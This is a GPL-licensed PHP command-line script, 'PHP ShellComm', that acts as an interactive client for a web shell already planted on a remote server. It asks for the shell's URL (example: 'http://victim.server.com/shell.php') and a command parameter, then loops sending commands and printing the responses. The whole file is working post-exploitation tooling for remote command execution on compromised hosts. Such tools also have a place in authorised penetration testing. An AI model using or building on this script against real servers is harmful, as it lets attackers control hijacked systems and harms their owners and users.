<?php

#  ***************************************************************************
#  PHP Shellcomm: communicate with a remote shell
#  Copyright (C) <2017>  <Ivan Ariel Barrera Oro>
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#  ***************************************************************************

const VERSION = '0.3.1';

require_once('HC' . DIRECTORY_SEPARATOR . 'Bootstrap.php');
error_reporting(E_ALL);

function bye() {
	return PHP_EOL . 'Bye!' . PHP_EOL;
}

$shellcomm = new \HC\Hacking\ShellComm();

echo $shellcomm->colour(
"
______ _   _ ______   _____ _          _ _ _____                           
| ___ \ | | || ___ \ /  ___| |        | | /  __ \                          
| |_/ / |_| || |_/ / \ `--.| |__   ___| | | /  \/ ___  _ __ ___  _ __ ___  
|  __/|  _  ||  __/   `--. \ '_ \ / _ \ | | |    / _ \| '_ ` _ \| '_ ` _ \ 
| |   | | | || |     /\__/ / | | |  __/ | | \__/\ (_) | | | | | | | | | | |
\_|   \_| |_/\_|     \____/|_| |_|\___|_|_|\____/\___/|_| |_| |_|_| |_| |_|
                                                                           
",
'shell',
'bold');

echo $shellcomm->colour(
	'PHP ShellComm v' . VERSION .
	' by HacKan (https://hackan.net) - GNU GPL v3.0+' . PHP_EOL .
	'Communicate with a remote shell with easy and more comfortable' . PHP_EOL .
	PHP_EOL,
	'info'
);

if (php_sapi_name() != 'cli') {
	die('Error: this script must be run as CLI');
}

while(true) {
	echo $shellcomm->colour(
		'Set remote shell URL with protocol but without parameters, ' .
		'like: http://victim.server.com/shell.php: '
	);
	$shell_url = readline();
	if (filter_var($shell_url, FILTER_VALIDATE_URL)) {
		break;
	} elseif ($shell_url === false) {
		echo $shellcomm->colour(bye());
		exit();
	} else {
		echo $shellcomm->colour(
			'The URL seems wrong, type it again please...', 'error'
		), PHP_EOL;
	}
}

echo $shellcomm->colour(
	'Set remote shell parameter for command [cmd]: '
);
$shell_param = readline() ?: 'cmd';

$shellcomm->setShellUrl($shell_url);
$shellcomm->setShellParam($shell_param);

echo $shellcomm->colour(
	PHP_EOL.
	 'Commands will execute in ' . $shell_url . '?' . $shell_param 
	 . '=<command>' . PHP_EOL . PHP_EOL
	 . 'Entering shell, exit with ',
	 'info'
 ),
 $shellcomm->colour('CTRL+D', 'warning', 'italic'),
 $shellcomm->colour('...', 'info'), PHP_EOL;

$response = $shellcomm->run();
while($response != false) {
	echo $response, PHP_EOL;
	$response = $shellcomm->run();
}

echo $shellcomm->colour(bye());
